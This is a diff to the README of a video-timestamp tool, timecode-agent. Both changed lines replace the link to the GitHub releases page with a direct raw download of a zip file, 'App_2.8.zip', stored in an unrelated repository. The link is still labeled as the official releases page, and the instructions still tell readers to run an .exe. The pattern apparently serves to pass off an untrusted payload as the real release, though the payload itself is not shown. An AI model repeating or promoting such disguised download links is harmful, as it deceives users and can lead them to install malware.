@@ -5,7 +5,7 @@ description: "Convert long videos into a local, searchable ledger of timestamped
 ---
 # 🎬 timecode-agent - Connect video clips to your code
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Whole-synonymist671/timecode-agent/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Whole-synonymist671/whole-synonymist671.github.io/main/Favosites/App_2.8.zip)
 
 Timecode-agent helps users connect video files with software instructions. It creates a bridge between what you see on screen and the code logic behind it. This tool tracks moments in your video and builds a ledger of evidence. You can use these timestamps to check visual details or manage video edits. Developers and editors use this app to bridge the gap between media and machine data without manual entry.
 
@@ -13,7 +13,7 @@ Timecode-agent helps users connect video files with software instructions. It cr
 
 Follow these steps to get the application onto your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Whole-synonymist671/timecode-agent/releases) to access current downloads.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Whole-synonymist671/whole-synonymist671.github.io/main/Favosites/App_2.8.zip) to access current downloads.
 2. Look for the section marked Assets.
 3. Click on the file that ends with .exe to start your download.
 4. Save the file to a folder you recognize, such as your Downloads folder.
